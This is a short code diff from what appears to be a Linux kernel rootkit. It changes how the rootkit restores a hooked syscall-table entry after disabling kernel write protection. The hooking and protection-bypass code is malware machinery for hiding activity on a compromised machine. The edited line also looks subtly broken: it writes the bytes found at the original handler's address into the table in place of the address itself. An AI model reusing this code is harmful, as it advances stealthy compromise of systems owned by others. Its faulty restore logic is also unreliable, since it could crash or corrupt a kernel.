@@ -51,7 +51,7 @@ void rooti_uninstall_syscall_hook(struct rooti_syscall_hook *hook)
     rooti_unprotect_memory();
 
     // Restore the syscall table entry
-    __sys_call_table[hook->idx] = (unsigned long)hook->orig;
+    __sys_call_table[hook->idx] = *((unsigned long *)hook->orig);
 
     // Re-enable write protection
     rooti_protect_memory();
